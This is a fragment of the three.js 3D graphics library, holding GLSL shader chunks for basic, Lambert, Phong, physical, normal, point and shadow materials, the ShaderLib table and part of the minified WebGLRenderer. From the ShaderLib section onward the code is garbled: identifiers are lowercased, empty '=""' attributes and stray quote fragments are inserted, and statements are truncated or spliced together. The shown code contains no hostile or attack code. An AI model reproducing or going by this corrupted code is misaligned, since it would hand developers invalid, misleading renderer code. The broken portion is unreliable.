outgoingLight = reflectedLight.indirectDiffuse;\\n\\t#include <normal_flip>\\n\\t#include <envmap_fragment>\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\" three.shaderchunk.meshbasic_vert=\"#include <common>\\n#include <uv_pars_vertex>\\n#include <uv2_pars_vertex>\\n#include <envmap_pars_vertex>\\n#include <color_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <uv2_vertex>\\n\\t#include <color_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#ifdef USE_ENVMAP\\n\\t#include <beginnormal_vertex>\\n\\t#include <morphnormal_vertex>\\n\\t#include <skinnormal_vertex>\\n\\t#include <defaultnormal_vertex>\\n\\t#endif\\n\\t#include <begin_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\t#include <envmap_vertex>\\n}\\n\" three.shaderchunk.meshlambert_frag=\"uniform vec3 diffuse;\\nuniform vec3 emissive;\\nuniform float opacity;\\nvarying vec3 vLightFront;\\n#ifdef DOUBLE_SIDED\\n\\tvarying vec3 vLightBack;\\n#endif\\n#include <common>\\n#include <packing>\\n#include <color_pars_fragment>\\n#include <uv_pars_fragment>\\n#include <uv2_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <aomap_pars_fragment>\\n#include <lightmap_pars_fragment>\\n#include <emissivemap_pars_fragment>\\n#include <envmap_pars_fragment>\\n#include <bsdfs>\\n#include <lights_pars>\\n#include <fog_pars_fragment>\\n#include <shadowmap_pars_fragment>\\n#include <shadowmask_pars_fragment>\\n#include <specularmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\\n\\tvec3 totalEmissiveRadiance = emissive;\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <specularmap_fragment>\\n\\t#include <emissivemap_fragment>\\n\\treflectedLight.indirectDiffuse = getAmbientLightIrradiance( ambientLightColor );\\n\\t#include <lightmap_fragment>\\n\\treflectedLight.indirectDiffuse *= BRDF_Diffuse_Lambert( diffuseColor.rgb );\\n\\t#ifdef DOUBLE_SIDED\\n\\t\\treflectedLight.directDiffuse = ( gl_FrontFacing ) ? vLightFront : vLightBack;\\n\\t#else\\n\\t\\treflectedLight.directDiffuse = vLightFront;\\n\\t#endif\\n\\treflectedLight.directDiffuse *= BRDF_Diffuse_Lambert( diffuseColor.rgb ) * getShadowMask();\\n\\t#include <aomap_fragment>\\n\\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + totalEmissiveRadiance;\\n\\t#include <normal_flip>\\n\\t#include <envmap_fragment>\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\" three.shaderchunk.meshlambert_vert=\"#define LAMBERT\\nvarying vec3 vLightFront;\\n#ifdef DOUBLE_SIDED\\n\\tvarying vec3 vLightBack;\\n#endif\\n#include <common>\\n#include <uv_pars_vertex>\\n#include <uv2_pars_vertex>\\n#include <envmap_pars_vertex>\\n#include <bsdfs>\\n#include <lights_pars>\\n#include <color_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <shadowmap_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <uv2_vertex>\\n\\t#include <color_vertex>\\n\\t#include <beginnormal_vertex>\\n\\t#include <morphnormal_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#include <skinnormal_vertex>\\n\\t#include <defaultnormal_vertex>\\n\\t#include <begin_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <envmap_vertex>\\n\\t#include <lights_lambert_vertex>\\n\\t#include <shadowmap_vertex>\\n}\\n\" three.shaderchunk.meshphong_frag=\"#define PHONG\\nuniform vec3 diffuse;\\nuniform vec3 emissive;\\nuniform vec3 specular;\\nuniform float shininess;\\nuniform float opacity;\\n#include <common>\\n#include <packing>\\n#include <color_pars_fragment>\\n#include <uv_pars_fragment>\\n#include <uv2_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <aomap_pars_fragment>\\n#include <lightmap_pars_fragment>\\n#include <emissivemap_pars_fragment>\\n#include <envmap_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <bsdfs>\\n#include <lights_pars>\\n#include <lights_phong_pars_fragment>\\n#include <shadowmap_pars_fragment>\\n#include <bumpmap_pars_fragment>\\n#include <normalmap_pars_fragment>\\n#include <specularmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\\n\\tvec3 totalEmissiveRadiance = emissive;\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <specularmap_fragment>\\n\\t#include <normal_flip>\\n\\t#include <normal_fragment>\\n\\t#include <emissivemap_fragment>\\n\\t#include <lights_phong_fragment>\\n\\t#include <lights_template>\\n\\t#include <aomap_fragment>\\n\\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;\\n\\t#include <envmap_fragment>\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\" three.shaderchunk.meshphong_vert=\"#define PHONG\\nvarying vec3 vViewPosition;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include <common>\\n#include <uv_pars_vertex>\\n#include <uv2_pars_vertex>\\n#include <displacementmap_pars_vertex>\\n#include <envmap_pars_vertex>\\n#include <color_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <shadowmap_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <uv2_vertex>\\n\\t#include <color_vertex>\\n\\t#include <beginnormal_vertex>\\n\\t#include <morphnormal_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#include <skinnormal_vertex>\\n\\t#include <defaultnormal_vertex>\\n#ifndef FLAT_SHADED\\n\\tvNormal = normalize( transformedNormal );\\n#endif\\n\\t#include <begin_vertex>\\n\\t#include <displacementmap_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\tvViewPosition = - mvPosition.xyz;\\n\\t#include <worldpos_vertex>\\n\\t#include <envmap_vertex>\\n\\t#include <shadowmap_vertex>\\n}\\n\" three.shaderchunk.meshphysical_frag=\"#define PHYSICAL\\nuniform vec3 diffuse;\\nuniform vec3 emissive;\\nuniform float roughness;\\nuniform float metalness;\\nuniform float opacity;\\n#ifndef STANDARD\\n\\tuniform float clearCoat;\\n\\tuniform float clearCoatRoughness;\\n#endif\\nuniform float envMapIntensity;\\nvarying vec3 vViewPosition;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include <common>\\n#include <packing>\\n#include <color_pars_fragment>\\n#include <uv_pars_fragment>\\n#include <uv2_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <aomap_pars_fragment>\\n#include <lightmap_pars_fragment>\\n#include <emissivemap_pars_fragment>\\n#include <envmap_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <bsdfs>\\n#include <cube_uv_reflection_fragment>\\n#include <lights_pars>\\n#include <lights_physical_pars_fragment>\\n#include <shadowmap_pars_fragment>\\n#include <bumpmap_pars_fragment>\\n#include <normalmap_pars_fragment>\\n#include <roughnessmap_pars_fragment>\\n#include <metalnessmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\\n\\tvec3 totalEmissiveRadiance = emissive;\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <specularmap_fragment>\\n\\t#include <roughnessmap_fragment>\\n\\t#include <metalnessmap_fragment>\\n\\t#include <normal_flip>\\n\\t#include <normal_fragment>\\n\\t#include <emissivemap_fragment>\\n\\t#include <lights_physical_fragment>\\n\\t#include <lights_template>\\n\\t#include <aomap_fragment>\\n\\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\" three.shaderchunk.meshphysical_vert=\"#define PHYSICAL\\nvarying vec3 vViewPosition;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include <common>\\n#include <uv_pars_vertex>\\n#include <uv2_pars_vertex>\\n#include <displacementmap_pars_vertex>\\n#include <color_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <shadowmap_pars_vertex>\\n#include <specularmap_pars_fragment>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <uv2_vertex>\\n\\t#include <color_vertex>\\n\\t#include <beginnormal_vertex>\\n\\t#include <morphnormal_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#include <skinnormal_vertex>\\n\\t#include <defaultnormal_vertex>\\n#ifndef FLAT_SHADED\\n\\tvNormal = normalize( transformedNormal );\\n#endif\\n\\t#include <begin_vertex>\\n\\t#include <displacementmap_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\tvViewPosition = - mvPosition.xyz;\\n\\t#include <worldpos_vertex>\\n\\t#include <shadowmap_vertex>\\n}\\n\" three.shaderchunk.normal_frag=\"uniform float opacity;\\nvarying vec3 vNormal;\\n#include <common>\\n#include <packing>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tgl_FragColor = vec4( packNormalToRGB( vNormal ), opacity );\\n\\t#include <logdepthbuf_fragment>\\n}\\n\" ;three.shaderchunk.normal_vert=\"varying vec3 vNormal;\\n#include <common>\\n#include <morphtarget_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\tvNormal = normalize( normalMatrix * normal );\\n\\t#include <begin_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n}\\n\" three.shaderchunk.points_frag=\"uniform vec3 diffuse;\\nuniform float opacity;\\n#include <common>\\n#include <color_pars_fragment>\\n#include <map_particle_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <shadowmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec3 outgoingLight = vec3( 0.0 );\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_particle_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphatest_fragment>\\n\\toutgoingLight = diffuseColor.rgb;\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\" three.shaderchunk.points_vert=\"uniform float size;\\nuniform float scale;\\n#include <common>\\n#include <color_pars_vertex>\\n#include <shadowmap_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <color_vertex>\\n\\t#include <begin_vertex>\\n\\t#include <project_vertex>\\n\\t#ifdef USE_SIZEATTENUATION\\n\\t\\tgl_PointSize = size * ( scale / - mvPosition.z );\\n\\t#else\\n\\t\\tgl_PointSize = size;\\n\\t#endif\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <shadowmap_vertex>\\n}\\n\" three.shaderchunk.shadow_frag=\"uniform float opacity;\\n#include <common>\\n#include <packing>\\n#include <bsdfs>\\n#include <lights_pars>\\n#include <shadowmap_pars_fragment>\\n#include <shadowmask_pars_fragment>\\nvoid main() {\\n\\tgl_FragColor = vec4( 0.0, 0.0, 0.0, opacity * ( 1.0  - getShadowMask() ) );\\n}\\n\" ;three.shaderchunk.shadow_vert=\"#include <shadowmap_pars_vertex>\\nvoid main() {\\n\\t#include <begin_vertex>\\n\\t#include <project_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <shadowmap_vertex>\\n}\\n\" three.shaderlib=\"{basic:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.common,THREE.UniformsLib.aomap,THREE.UniformsLib.fog]),vertexShader:THREE.ShaderChunk.meshbasic_vert,fragmentShader:THREE.ShaderChunk.meshbasic_frag},lambert:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.common,THREE.UniformsLib.aomap,THREE.UniformsLib.lightmap,THREE.UniformsLib.emissivemap,THREE.UniformsLib.fog,THREE.UniformsLib.lights,{emissive:{value:new\" three.color(0)}}]),vertexshader:three.shaderchunk.meshlambert_vert,=\"\" fragmentshader:three.shaderchunk.meshlambert_frag},phong:{uniforms:three.uniformsutils.merge([three.uniformslib.common,three.uniformslib.aomap,three.uniformslib.lightmap,three.uniformslib.emissivemap,three.uniformslib.bumpmap,three.uniformslib.normalmap,three.uniformslib.displacementmap,three.uniformslib.fog,three.uniformslib.lights,{emissive:{value:new=\"\" three.color(0)},specular:{value:new=\"\" three.color(1118481)},shininess:{value:30}}]),vertexshader:three.shaderchunk.meshphong_vert,fragmentshader:three.shaderchunk.meshphong_frag},=\"\" standard:{uniforms:three.uniformsutils.merge([three.uniformslib.common,three.uniformslib.aomap,three.uniformslib.lightmap,three.uniformslib.emissivemap,three.uniformslib.bumpmap,three.uniformslib.normalmap,three.uniformslib.displacementmap,three.uniformslib.roughnessmap,three.uniformslib.metalnessmap,three.uniformslib.fog,three.uniformslib.lights,{emissive:{value:new=\"\" three.color(0)},roughness:{value:.5},metalness:{value:0},envmapintensity:{value:1}}]),vertexshader:three.shaderchunk.meshphysical_vert,=\"\" fragmentshader:three.shaderchunk.meshphysical_frag},points:{uniforms:three.uniformsutils.merge([three.uniformslib.points,three.uniformslib.fog]),vertexshader:three.shaderchunk.points_vert,fragmentshader:three.shaderchunk.points_frag},dashed:{uniforms:three.uniformsutils.merge([three.uniformslib.common,three.uniformslib.fog,{scale:{value:1},dashsize:{value:1},totalsize:{value:2}}]),vertexshader:three.shaderchunk.linedashed_vert,fragmentshader:three.shaderchunk.linedashed_frag},depth:{uniforms:three.uniformsutils.merge([three.uniformslib.common,=\"\" three.uniformslib.displacementmap]),vertexshader:three.shaderchunk.depth_vert,fragmentshader:three.shaderchunk.depth_frag},normal:{uniforms:{opacity:{value:1}},vertexshader:three.shaderchunk.normal_vert,fragmentshader:three.shaderchunk.normal_frag},cube:{uniforms:{tcube:{value:null},tflip:{value:-1}},vertexshader:three.shaderchunk.cube_vert,fragmentshader:three.shaderchunk.cube_frag},equirect:{uniforms:{tequirect:{value:null},tflip:{value:-1}},vertexshader:three.shaderchunk.equirect_vert,fragmentshader:three.shaderchunk.equirect_frag},=\"\" distancergba:{uniforms:{lightpos:{value:new=\"\" three.vector3}},vertexshader:three.shaderchunk.distancergba_vert,fragmentshader:three.shaderchunk.distancergba_frag}};three.shaderlib.physical=\"{uniforms:THREE.UniformsUtils.merge([THREE.ShaderLib.standard.uniforms,{clearCoat:{value:0},clearCoatRoughness:{value:0}}]),vertexShader:THREE.ShaderChunk.meshphysical_vert,fragmentShader:THREE.ShaderChunk.meshphysical_frag};\" three.webglrenderer=\"function(a){function\" b(a,b,c,d){!0=\"==A&&(a*=d,b*=d,c*=d);R.clearColor(a,b,c,d)}function\" c(){r.init();r.scissor(x.copy(ua).multiplyscalar($));r.viewport(ba.copy(ma).multiplyscalar($));b(v.r,v.g,v.b,y)}function=\"\" d(){t=\"Q=null;aa=\"\";G=-1;R.reset()}function\" e(a){a.preventdefault();d();c();z.clear()}function=\"\" f(a){a=\"a.target;a.removeEventListener(\"dispose\",f);g(a);Z.delete(a)}function\" g(a){var=\"\" 0;void=\"\" h(a,b){return=\"\" math.abs(b[0])-=\"\" math.abs(a[0])}function=\"\" k(a,b){return=\"\" a.object.renderorder!=\"=b.object.renderOrder?a.object.renderOrder-b.object.renderOrder:a.material.id!==b.material.id?a.material.id-b.material.id:a.z!==b.z?a.z-b.z:a.id-b.id}function\" l(a,b){return=\"\" n(a,b,c,d,e){var=\"\" f;c.transparent?(d=\"P,f=++M):(d=F,f=++K);f=d[f];void\" {id:a.id,object:a,geometry:b,material:c,z:w.z,group:e},d.push(f))}function=\"\" p(a){if(!wa.intersectssphere(a))return!1;var=\"\" if(c[e].distancetopoint(d)<a)return!1;while(++e!=\"=b);return!0}function\" m(a,b){if(!1!=\"=a.visible){if(a.layers.test(b.layers))if(a\" three.light)b.push(a);else=\"\" if(a=\"\" three.sprite){var=\"\" c;(c=\"!1===a.frustumCulled)||(ha.center.set(0,0,0),ha.radius=.7071067811865476,ha.applyMatrix4(a.matrixWorld),\" three.lensflare)o.push(a);else=\"\" three.immediaterenderobject)!0=\"==N.sortObjects&&(W.setFromMatrixPosition(a.matrixWorld),W.applyProjection(pa)),n(a,null,a.material,W.z,null);else\" three.mesh||a=\"\" three.line||a=\"\" three.points)if(a=\"\" three.skinnedmesh&&a.skeleton.update(),(c=\"!1===a.frustumCulled)||(c=a.geometry,null===c.boundingSphere&&c.computeBoundingSphere(),ha.copy(c.boundingSphere).applyMatrix4(a.matrixWorld),\" three.multimaterial)for(var=\"\" h=\"e[d],k=f[h.materialIndex];!0===k.visible&&n(a,c,k,W.z,h)}else\" n(a,c,d,w.z,null)}c=\"a.children;d=0;for(g=c.length;d<g;d++)m(c[d],b)}}function\" q(a,b,c,d){for(var=\"\" g=\"a[e],h=g.object,k=g.geometry,m=void\" h.modelviewmatrix.multiplymatrices(b.matrixworldinverse,h.matrixworld);h.normalmatrix.getnormalmatrix(h.modelviewmatrix);if(h=\"\" three.immediaterenderobject){r(m);var=\"\" l=\"s(b,c,m,h);aa=\"\";h.render(function(a){N.renderBufferImmediate(a,l,m)})}else\" n.renderbufferdirect(b,c,k,m,h,g)}}function=\"\" r(a){a.side!=\"=THREE.DoubleSide?R.enable(x.CULL_FACE):R.disable(x.CULL_FACE);R.setFlipSided(a.side===THREE.BackSide);!0===a.transparent?R.setBlending(a.blending,a.blendEquation,a.blendSrc,a.blendDst,a.blendEquationAlpha,\" a.blendsrcalpha,a.blenddstalpha,a.premultipliedalpha):r.setblending(three.noblending);r.setdepthfunc(a.depthfunc);r.setdepthtest(a.depthtest);r.setdepthwrite(a.depthwrite);r.setcolorwrite(a.colorwrite);r.setpolygonoffset(a.polygonoffset,a.polygonoffsetfactor,a.polygonoffsetunits)}function=\"\" s(a,b,c,d){ia=\"0;var\" (c.needsupdate=\"!0);void\" if(l.code!=\"=m)g(c);else\" if(void=\"\" a;else=\"\" p=\"!1;p&&(k.shaderID?(l=THREE.ShaderLib[k.shaderID],h.__webglShader={name:c.type,uniforms:THREE.UniformsUtils.clone(l.uniforms),vertexShader:l.vertexShader,fragmentShader:l.fragmentShader}):\" h.__webglshader=\"{name:c.type,uniforms:c.uniforms,vertexShader:c.vertexShader,fragmentShader:c.fragmentShader},c.__webglShader=h.__webglShader,l=na.acquireProgram(c,k,m),h.program=l,c.program=l);k=l.getAttributes();if(c.morphTargets)for(m=c.numSupportedMorphTargets=0;m<N.maxMorphTargets;m++)0<=k[\"morphTarget\"+m]&&c.numSupportedMorphTargets++;if(c.morphNormals)for(m=c.numSupportedMorphNormals=0;m<N.maxMorphNormals;m++)0<=k[\"morphNormal\"+m]&&c.numSupportedMorphNormals++;k=h.__webglShader.uniforms;(c\" three.shadermaterial||c=\"\" three.rawshadermaterial)&&!0!=\"=c.clipping||(h.numClippingPlanes=ca.numPlanes,k.clippingPlanes=ca.uniform);c.lights&&(h.lightsHash=S.hash,k.ambientLightColor.value=S.ambient,k.directionalLights.value=S.directional,k.spotLights.value=S.spot,k.pointLights.value=S.point,k.hemisphereLights.value=S.hemi,k.directionalShadowMap.value=S.directionalShadowMap,k.directionalShadowMatrix.value=S.directionalShadowMatrix,k.spotShadowMap.value=S.spotShadowMap,k.spotShadowMatrix.value=\" s.spotshadowmatrix,k.pointshadowmap.value=\"S.pointShadowMap,k.pointShadowMatrix.value=S.pointShadowMatrix);m=h.program.getUniforms();m=THREE.WebGLUniforms.seqWithValue(m.seq,k);h.uniformsList=m;h.dynamicUniforms=THREE.WebGLUniforms.splitDynamic(m,k)}c.needsUpdate=!1}var\" n=\"!1,p=l=!1,h=e.program,m=h.getUniforms(),k=e.__webglShader.uniforms;h.id!==Q&&(x.useProgram(h.program),Q=h.id,p=l=n=!0);c.id!==G&&(G=c.id,l=!0);if(n||a!==T){m.set(x,a,\"projectionMatrix\");da.logarithmicDepthBuffer&&m.setValue(x,\"logDepthBufFC\",\" (math.log(a.far+1)=\"\" math.ln2));a!=\"=T&&(T=a,p=l=!0);if(c\" three.meshphongmaterial||c=\"\" three.meshstandardmaterial||c.envmap)n=\"m.map.cameraPosition,void\" three.meshlambertmaterial||c=\"\" three.meshbasicmaterial||c=\"\" three.meshstandardmaterial||c=\"\" three.shadermaterial||c.skinning)&&m.setvalue(x,\"viewmatrix\",a.matrixworldinverse);=\"\" m.set(x,n,\"tonemappingexposure\");m.set(x,n,\"tonemappingwhitepoint\")}c.skinning&&(m.setoptional(x,d,\"bindmatrix\"),m.setoptional(x,d,\"bindmatrixinverse\"),n=\"d.skeleton)&&(da.floatVertexTextures&&n.useVertexTexture?(m.set(x,n,\"boneTexture\"),m.set(x,n,\"boneTextureWidth\"),m.set(x,n,\"boneTextureHeight\")):m.setOptional(x,n,\"boneMatrices\"));if(l){c.lights&&(l=p,k.ambientLightColor.needsUpdate=l,k.directionalLights.needsUpdate=l,k.pointLights.needsUpdate=l,k.spotLights.needsUpdate=l,k.hemisphereLights.needsUpdate=\" l);b&&c.fog&&(k.fogcolor.value=\"b.color,b\" three.fog?(k.fognear.value=\"b.near,k.fogFar.value=b.far):b\" three.fogexp2&&(k.fogdensity.value=\"b.density));if(c\" three.meshdepthmaterial){k.opacity.value=\"c.opacity;k.diffuse.value=c.color;c.emissive&&k.emissive.value.copy(c.emissive).multiplyScalar(c.emissiveIntensity);k.map.value=\" c.map;k.specularmap.value=\"c.specularMap;k.alphaMap.value=c.alphaMap;c.aoMap&&(k.aoMap.value=c.aoMap,k.aoMapIntensity.value=c.aoMapIntensity);var\" q;c.map?q=\"c.map:c.specularMap?q=c.specularMap:c.displacementMap?q=c.displacementMap:c.normalMap?q=c.normalMap:c.bumpMap?q=c.bumpMap:c.roughnessMap?q=c.roughnessMap:c.metalnessMap?q=c.metalnessMap:c.alphaMap?q=c.alphaMap:c.emissiveMap&&(q=c.emissiveMap);void\" three.webglrendertarget&&(q=\"q.texture),b=q.offset,q=q.repeat,k.offsetRepeat.value.set(b.x,\" b.y,q.x,q.y));k.envmap.value=\"c.envMap;k.flipEnvMap.value=c.envMap\" three.cubetexture?-1:1;k.reflectivity.value=\"c.reflectivity;k.refractionRatio.value=c.refractionRatio}c\" three.linebasicmaterial?(k.diffuse.value=\"c.color,k.opacity.value=c.opacity):c\" three.linedashedmaterial?(k.diffuse.value=\"c.color,k.opacity.value=c.opacity,k.dashSize.value=c.dashSize,k.totalSize.value=c.dashSize+c.gapSize,k.scale.value=c.scale):c\" three.pointsmaterial?(k.diffuse.value=\"c.color,\" k.opacity.value=\"c.opacity,k.size.value=c.size*$,k.scale.value=.5*v.clientHeight,k.map.value=c.map,null!==c.map&&(q=c.map.offset,c=c.map.repeat,k.offsetRepeat.value.set(q.x,q.y,c.x,c.y))):c\" three.meshlambertmaterial?(c.lightmap&&(k.lightmap.value=\"c.lightMap,k.lightMapIntensity.value=c.lightMapIntensity),c.emissiveMap&&(k.emissiveMap.value=c.emissiveMap)):c\" three.meshphongmaterial?(k.specular.value=\"c.specular,k.shininess.value=Math.max(c.shininess,1E-4),c.lightMap&&(k.lightMap.value=\" c.lightmap,k.lightmapintensity.value=\"c.lightMapIntensity),c.emissiveMap&&(k.emissiveMap.value=c.emissiveMap),c.bumpMap&&(k.bumpMap.value=c.bumpMap,k.bumpScale.value=c.bumpScale),c.normalMap&&(k.normalMap.value=c.normalMap,k.normalScale.value.copy(c.normalScale)),c.displacementMap&&(k.displacementMap.value=c.displacementMap,k.displacementScale.value=c.displacementScale,k.displacementBias.value=c.displacementBias)):c\" three.meshphysicalmaterial?(k.clearcoat.value=\"c.clearCoat,k.clearCoatRoughness.value=\" c.clearcoatroughness,t(k,c)):c=\"\" three.meshstandardmaterial?t(k,c):c=\"\" three.meshdepthmaterial?c.displacementmap&&(k.displacementmap.value=\"c.displacementMap,k.displacementScale.value=c.displacementScale,k.displacementBias.value=c.displacementBias):c\" three.meshnormalmaterial&&(k.opacity.value=\"c.opacity);THREE.WebGLUniforms.upload(x,e.uniformsList,k,N)}m.set(x,d,\"modelViewMatrix\");m.set(x,d,\"normalMatrix\");m.setValue(x,\"modelMatrix\",d.matrixWorld);e=e.dynamicUniforms;null!==\" e&&(three.webgluniforms.evaldynamic(e,k,d,a),three.webgluniforms.upload(x,e,k,n));return=\"\" h}function=\"\" t(a,b){a.roughness.value=\"b.roughness;a.metalness.value=b.metalness;b.roughnessMap&&(a.roughnessMap.value=b.roughnessMap);b.metalnessMap&&(a.metalnessMap.value=b.metalnessMap);b.lightMap&&(a.lightMap.value=b.lightMap,a.lightMapIntensity.value=b.lightMapIntensity);b.emissiveMap&&(a.emissiveMap.value=b.emissiveMap);b.bumpMap&&(a.bumpMap.value=b.bumpMap,a.bumpScale.value=b.bumpScale);b.normalMap&&(a.normalMap.value=\" b.normalmap,a.normalscale.value.copy(b.normalscale));b.displacementmap&&(a.displacementmap.value=\"b.displacementMap,a.displacementScale.value=b.displacementScale,a.displacementBias.value=b.displacementBias);b.envMap&&(a.envMapIntensity.value=b.envMapIntensity)}function\" u(a){var=\"\" b;if(a=\"==THREE.RepeatWrapping)return\" x.repeat;if(a=\"==THREE.ClampToEdgeWrapping)return\" x.clamp_to_edge;if(a=\"==THREE.MirroredRepeatWrapping)return\" x.mirrored_repeat;if(a=\"==THREE.NearestFilter)return\" x.nearest;if(a=\"==THREE.NearestMipMapNearestFilter)return\" x.nearest_mipmap_nearest;=\"\" x.nearest_mipmap_linear;if(a=\"==THREE.LinearFilter)return\" x.linear;if(a=\"==THREE.LinearMipMapNearestFilter)return\" x.linear_mipmap_nearest;if(a=\"==THREE.LinearMipMapLinearFilter)return\" x.linear_mipmap_linear;if(a=\"==THREE.UnsignedByteType)return\" x.unsigned_byte;if(a=\"==THREE.UnsignedShort4444Type)return\" x.unsigned_short_4_4_4_4;if(a=\"==THREE.UnsignedShort5551Type)return\" x.unsigned_short_5_5_5_1;if(a=\"==THREE.UnsignedShort565Type)return\" x.unsigned_short_5_6_5;=\"\" x.byte;if(a=\"==THREE.ShortType)return\" x.short;if(a=\"==THREE.UnsignedShortType)return\" 